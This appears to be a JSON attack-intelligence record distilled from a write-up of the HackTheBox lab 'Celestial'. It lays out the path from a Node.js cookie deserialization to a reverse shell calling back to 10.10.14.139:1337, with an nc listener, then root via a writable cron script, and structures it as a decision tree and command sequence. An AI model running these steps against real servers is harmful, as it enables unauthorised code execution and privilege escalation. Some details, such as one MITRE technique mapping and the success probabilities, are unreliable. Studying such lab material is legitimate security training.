{
  "writeup_id": "Htb_Celestial",
  "scenario_fingerprint": {
    "scenario_name": "nodejs_deserialization_rce",
    "primary_services": [
      "http",
      "nodejs"
    ],
    "port_signature": "3000",
    "service_combination": "nodejs+express",
    "os_family": "linux",
    "environment_type": "web_application",
    "entry_vector": "deserialization_attack",
    "privilege_path": "web_user_to_root_via_cron",
    "attack_complexity": "medium",
    "estimated_time": "30-45 minutes",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "base64_encoded_cookie",
      "nodejs_express_framework",
      "user_controlled_serialized_data",
      "cookie_based_deserialization"
    ],
    "environmental_clues": [
      "port_3000_http_service",
      "express_powered_by_header",
      "json_cookie_structure",
      "dynamic_content_generation"
    ],
    "similar_scenarios": [
      "node_blog_deserialization",
      "express_cookie_rce"
    ],
    "unique_aspects": [
      "mathematical_operation_in_response",
      "dummy_user_profile_cookie",
      "immediate_deserialization_feedback"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "NodeJS_Deserialization",
        "success_reason": "Application deserializes user-controlled cookie data without validation",
        "prerequisite_indicators": [
          "nodejs_express_framework",
          "base64_encoded_cookies",
          "cookie_contains_json_data",
          "application_processes_cookie_on_refresh"
        ],
        "recognition_patterns": [
          "X-Powered-By: Express header",
          "port 3000 (default Node.js)",
          "base64 cookie that decodes to JSON",
          "application behavior changes with cookie modification",
          "error messages reveal deserialization"
        ],
        "failure_modes": [
          "input_validation_on_deserialization",
          "cookies_signed_or_encrypted",
          "no_user_controlled_serialized_data",
          "sandboxed_execution_environment"
        ],
        "environmental_factors": [
          "default_nodejs_configuration",
          "unsafe_deserialization_practices",
          "no_input_sanitization",
          "direct_eval_usage"
        ],
        "success_probability": 0.92,
        "typical_timeframe": "10-30 minutes"
      },
      {
        "technique": "Cron_Job_Privilege_Escalation",
        "success_reason": "Root cron job executes user-writable files",
        "prerequisite_indicators": [
          "user_shell_access_obtained",
          "cron_jobs_running_as_root",
          "user_writable_files_in_cron_path"
        ],
        "recognition_patterns": [
          "crontab enumeration shows root jobs",
          "writable files in cron execution path",
          "periodic_execution_patterns",
          "file_modification_timestamps"
        ],
        "failure_modes": [
          "proper_file_permissions",
          "no_root_cron_jobs",
          "cron_uses_absolute_paths",
          "input_validation_in_cron_scripts"
        ],
        "environmental_factors": [
          "misconfigured_file_permissions",
          "development_environment_practices",
          "insufficient_privilege_separation"
        ],
        "success_probability": 0.78,
        "typical_timeframe": "5-20 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Base64 encoded JSON cookie",
        "discovery_method": "HTTP response analysis in Burp Suite",
        "why_critical": "Revealed deserialization attack vector leading to RCE",
        "how_to_recognize": [
          "Set-Cookie header with base64 data",
          "Cookie decodes to valid JSON",
          "Application behavior changes with cookie modification",
          "Express framework indicators"
        ],
        "follow_up_actions": [
          "decode_and_analyze_cookie_structure",
          "test_cookie_modification_impact",
          "craft_deserialization_payload",
          "establish_reverse_shell"
        ]
      },
      {
        "discovery": "NodeJS reverse shell payload",
        "discovery_method": "nodejsshell.py payload generation",
        "why_critical": "Provided initial foothold through deserialization exploit",
        "how_to_recognize": [
          "successful_payload_execution",
          "reverse_shell_connection_established",
          "user_level_access_confirmed"
        ],
        "follow_up_actions": [
          "enumerate_system_for_privesc",
          "check_cron_jobs",
          "identify_writable_files",
          "escalate_to_root"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "user_shell",
        "escalation_method": "cron_job_file_overwrite",
        "why_possible": "Root cron job executes user-writable files",
        "recognition_signs": [
          "crontab_shows_root_jobs",
          "user_writable_files_in_execution_path",
          "periodic_file_execution",
          "weak_file_permissions"
        ],
        "exploitation_path": "User Shell → Identify Cron Jobs → Overwrite Executed File → Root Shell"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Single port 3000 open running Node.js Express framework",
        "decision": "Focus on web application vulnerabilities specific to Node.js",
        "reasoning": "Port 3000 is default for Node.js/Express, limited attack surface suggests web app focus",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "port_enumeration",
            "when": "if additional services discovered"
          },
          {
            "option": "directory_bruteforce",
            "when": "if standard web attacks needed"
          }
        ],
        "success_indicators": [
          "express_framework_confirmed",
          "cookies_or_session_data_present",
          "javascript_errors_revealed"
        ],
        "next_decision": "analyze_application_behavior"
      },
      {
        "step": 2,
        "situation": "Base64 encoded cookie found in HTTP response",
        "decision": "Decode and analyze cookie structure for serialized data",
        "reasoning": "Base64 cookies in Node.js often contain serialized objects vulnerable to deserialization attacks",
        "confidence": 0.85,
        "prerequisites": [
          "http_response_intercepted",
          "cookie_identified"
        ],
        "success_indicators": [
          "json_structure_in_cookie",
          "user_controllable_parameters"
        ],
        "failure_fallbacks": [
          "parameter_tampering",
          "session_manipulation",
          "xss_testing"
        ]
      },
      {
        "step": 3,
        "situation": "Cookie contains JSON with user-controllable parameters that affect application output",
        "decision": "Test for Node.js deserialization vulnerability",
        "reasoning": "User input being deserialized and affecting output indicates potential RCE via malicious serialized objects",
        "confidence": 0.95,
        "prerequisites": [
          "json_cookie_decoded",
          "parameter_reflection_confirmed"
        ],
        "success_indicators": [
          "application_crashes_on_malformed_input",
          "parameter_values_reflected_in_response"
        ],
        "failure_fallbacks": [
          "sql_injection",
          "command_injection",
          "file_inclusion"
        ]
      },
      {
        "step": 4,
        "situation": "Deserialization vulnerability confirmed",
        "decision": "Create Node.js reverse shell payload with IIFE execution",
        "reasoning": "Node.js deserialization allows function execution, IIFE ensures immediate execution upon deserialization",
        "confidence": 0.9,
        "prerequisites": [
          "deserialization_confirmed",
          "payload_generation_tools_available"
        ],
        "success_indicators": [
          "reverse_shell_connection_established"
        ],
        "failure_fallbacks": [
          "file_write_payload",
          "dns_exfiltration",
          "time_based_confirmation"
        ]
      }
    ],
    "branching_logic": {
      "if_single_web_port": {
        "action": "deep_web_application_analysis",
        "focus": [
          "cookie_analysis",
          "parameter_tampering",
          "framework_specific_vulns"
        ],
        "next_phase": "identify_input_vectors"
      },
      "if_base64_cookie_found": {
        "action": "decode_and_analyze_structure",
        "tools": [
          "base64",
          "json_parsers",
          "burp_suite"
        ],
        "decision_criteria": "based_on_data_structure_and_user_control"
      },
      "if_deserialization_confirmed": {
        "action": "craft_malicious_payload",
        "tools": [
          "node-serialize",
          "nodejsshell.py"
        ],
        "payload_type": "reverse_shell_with_iife"
      },
      "if_shell_obtained": {
        "action": "enumerate_privilege_escalation",
        "focus": [
          "cron_jobs",
          "suid_binaries",
          "writable_files"
        ],
        "next_phase": "privilege_escalation"
      }
    },
    "optimization_rules": [
      {
        "rule": "always_check_cookies_for_base64_in_nodejs_apps",
        "reasoning": "high_probability_of_serialized_data_in_nodejs_applications",
        "applicability": "node_js_express_applications"
      },
      {
        "rule": "test_deserialization_when_user_input_affects_application_state",
        "reasoning": "user_controlled_serialized_data_often_leads_to_rce",
        "applicability": "applications_with_serialized_user_data"
      },
      {
        "rule": "use_iife_in_nodejs_deserialization_payloads",
        "reasoning": "ensures_immediate_execution_upon_deserialization",
        "applicability": "nodejs_deserialization_attacks"
      },
      {
        "rule": "check_cron_jobs_after_initial_access_on_linux",
        "reasoning": "common_privilege_escalation_vector_in_ctf_environments",
        "applicability": "linux_systems_with_user_access"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "NodeJS Deserialization",
        "mitre_id": "T1203",
        "required_services": [
          "http",
          "nodejs"
        ],
        "required_ports": [
          3000,
          8000,
          8080
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "nodejs_express_framework",
          "cookie_based_session_management",
          "base64_encoded_cookies",
          "user_input_deserialization"
        ],
        "success_indicators": [
          "express_framework_header",
          "base64_cookie_contains_json",
          "cookie_modification_affects_response",
          "application_crashes_on_malformed_input"
        ],
        "incompatible_with": [
          "stateless_applications",
          "jwt_tokens_only",
          "no_cookie_usage",
          "input_validation_present"
        ],
        "confidence_boosters": [
          "x_powered_by_express_header",
          "port_3000_default_nodejs",
          "json_structure_in_cookies",
          "dynamic_content_based_on_cookie"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "10-30 minutes"
      },
      {
        "technique": "Privilege Escalation via Cron",
        "mitre_id": "T1053.003",
        "required_services": [
          "cron"
        ],
        "required_ports": [],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "cron_service_running",
          "user_writable_scripts_in_cron",
          "cron_jobs_running_as_root",
          "file_system_access"
        ],
        "success_indicators": [
          "crontab_enumeration_successful",
          "writable_script_identified",
          "root_owned_cron_process",
          "script_execution_confirmed"
        ],
        "incompatible_with": [
          "no_cron_service",
          "read_only_file_system",
          "strict_file_permissions",
          "selinux_enforcing"
        ],
        "confidence_boosters": [
          "user_home_directory_scripts",
          "world_writable_cron_scripts",
          "recent_cron_activity",
          "development_environment_indicators"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "5-15 minutes"
      }
    ],
    "environmental_detectors": {
      "nodejs_application": {
        "port_indicators": [
          3000,
          8000,
          8080,
          9000
        ],
        "service_indicators": [
          "http",
          "nodejs",
          "express"
        ],
        "banner_indicators": [
          "Node.js",
          "Express framework",
          "X-Powered-By: Express"
        ],
        "confidence_threshold": 0.8
      },
      "linux_system": {
        "port_indicators": [
          22,
          80,
          443
        ],
        "service_indicators": [
          "ssh",
          "http",
          "https"
        ],
        "banner_indicators": [
          "Linux",
          "Ubuntu",
          "CentOS",
          "Debian"
        ],
        "confidence_threshold": 0.85
      },
      "web_application": {
        "port_indicators": [
          80,
          443,
          3000,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "technology_indicators": [
          "apache",
          "nginx",
          "express",
          "nodejs"
        ],
        "confidence_threshold": 0.9
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "nodejs_deserialization",
          "when": "nodejs_express_detected_with_cookies",
          "reason": "direct_rce_potential_common_vulnerability"
        },
        {
          "attack": "cron_privilege_escalation",
          "when": "linux_system_with_user_access",
          "reason": "high_success_rate_for_root_access"
        }
      ],
      "medium_priority": [
        {
          "attack": "web_directory_enumeration",
          "when": "web_service_detected",
          "reason": "reveals_additional_attack_surface"
        },
        {
          "attack": "cookie_manipulation",
          "when": "session_cookies_present",
          "reason": "potential_authentication_bypass"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Node.js Deserialization Attack",
        "mitre_id": "T1055.001",
        "category": "execution",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "nodejsshell.py",
            "command_template": "python /opt/Node.Js-Security-Course/nodejsshell.py {lhost} {lport}",
            "actual_command": "python /opt/Node.Js-Security-Course/nodejsshell.py 10.10.14.139 1337",
            "output_pattern": "eval(String.fromCharCode(",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "node-serialize",
            "command_template": "nodejs exploit.js | tail -n +2 | base64 -w0",
            "actual_command": "nodejs exploit.js | tail -n +2 | base64 -w0",
            "success_factors": [
              "vulnerable_deserialization",
              "cookie_manipulation"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "nodejs_express_application",
          "serialized_cookie_present",
          "unsafe_deserialization"
        ],
        "success_indicators": [
          "reverse_shell_connection",
          "code_execution_achieved",
          "user_level_access_obtained"
        ],
        "common_failures": [
          "serialization_format_incorrect",
          "network_connectivity_blocked",
          "input_validation_present"
        ],
        "follow_up_techniques": [
          "privilege_escalation",
          "cron_job_exploitation",
          "file_system_enumeration"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Cookie Manipulation",
        "mitre_id": "T1539",
        "category": "credential_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "base64",
            "command_template": "echo {cookie} | base64 -d",
            "actual_command": "echo eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ== | base64 -d",
            "output_pattern": "{\"username\":\"Dummy\"",
            "effectiveness_rating": 4,
            "reliability": 0.98
          },
          {
            "name": "sed",
            "command_template": "sed 's/\"{old_value}\"/\"{new_value}\"/g'",
            "actual_command": "sed 's/\"2\"/\"5\"/g'",
            "success_factors": [
              "json_structure_maintained"
            ],
            "effectiveness_rating": 4
          }
        ],
        "prerequisites": [
          "base64_encoded_cookie",
          "json_structure_in_cookie",
          "server_side_processing"
        ],
        "success_indicators": [
          "cookie_decoded_successfully",
          "modified_values_reflected",
          "application_behavior_changed"
        ],
        "common_failures": [
          "invalid_base64_encoding",
          "malformed_json_structure",
          "server_side_validation"
        ],
        "follow_up_techniques": [
          "deserialization_exploitation",
          "parameter_injection",
          "session_hijacking"
        ],
        "time_investment": "5-10 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "nodejsshell.py",
        "use_case": "nodejs_reverse_shell_generation",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "nodejs_exploitation"
        ],
        "alternatives": [
          "manual_shell_crafting",
          "msfvenom"
        ],
        "best_practices": [
          "verify_target_has_required_modules",
          "test_network_connectivity_first",
          "use_appropriate_shell_binary_for_target_os"
        ]
      },
      {
        "tool": "node-serialize",
        "use_case": "nodejs_serialization_exploitation",
        "effectiveness_rating": 5,
        "reliability": 0.9,
        "learning_curve": "medium",
        "essential_for": [
          "nodejs_deserialization_attacks"
        ],
        "alternatives": [
          "manual_serialization",
          "custom_exploit_scripts"
        ],
        "best_practices": [
          "add_iife_parentheses_for_immediate_execution",
          "test_payload_locally_before_deployment",
          "ensure_proper_base64_encoding"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "nodejs_deserialization_to_shell",
        "steps": [
          {
            "step": 1,
            "command": "nmap -sC -sV -oA nmap/initial 10.10.10.85",
            "purpose": "Identify Node.js Express service",
            "expected_output": "3000/tcp open http Node.js Express framework"
          },
          {
            "step": 2,
            "command": "echo eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ== | base64 -d",
            "purpose": "Decode and analyze cookie structure",
            "expected_output": "JSON object with user parameters"
          },
          {
            "step": 3,
            "command": "python /opt/Node.Js-Security-Course/nodejsshell.py 10.10.14.139 1337",
            "purpose": "Generate Node.js reverse shell payload",
            "expected_output": "eval(String.fromCharCode(...)) payload"
          },
          {
            "step": 4,
            "command": "nodejs exploit.js | tail -n +2 | base64 -w0",
            "purpose": "Create serialized payload with IIFE",
            "expected_output": "Base64 encoded malicious cookie"
          },
          {
            "step": 5,
            "command": "nc -lvnp 1337",
            "purpose": "Setup reverse shell listener",
            "expected_output": "Shell connection from target"
          }
        ],
        "success_rate": 0.85,
        "typical_duration": "15-25 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Celestial",
      "difficulty": "Medium",
      "os": "Linux",
      "platform": "HackTheBox",
      "release_date": "2018-03-10",
      "author": "3ndG4me",
      "estimated_time": "60-90 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "deserialization",
        "web_application"
      ],
      "key_vulnerabilities": [
        "nodejs_deserialization",
        "insecure_cron_job"
      ],
      "environment_type": "web_application_server",
      "real_world_relevance": "high",
      "learning_value": [
        "nodejs_security",
        "deserialization_attacks",
        "privilege_escalation"
      ],
      "prerequisite_knowledge": [
        "web_application_basics",
        "nodejs_fundamentals",
        "serialization_concepts"
      ]
    },
    "categorization": {
      "primary_category": "web_application",
      "subcategories": [
        "deserialization",
        "privilege_escalation"
      ],
      "attack_types": [
        "remote_code_execution",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "input_validation",
        "secure_deserialization",
        "cron_job_security"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Node",
        "Jasmin",
        "Arkham"
      ],
      "similarity_reasons": [
        "deserialization_vulnerabilities",
        "web_application_focus",
        "nodejs_environment"
      ],
      "unique_aspects": [
        "nodejs_express_framework",
        "cookie_based_deserialization",
        "cron_privilege_escalation"
      ],
      "difficulty_factors": [
        "deserialization_exploitation",
        "payload_crafting",
        "timing_based_escalation"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T19:06:07.807655",
    "original_file": "0xdf_writeups/Htb Celestial.md",
    "content_length": 23956,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 0.9166666666666667,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 0.6666666666666666,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}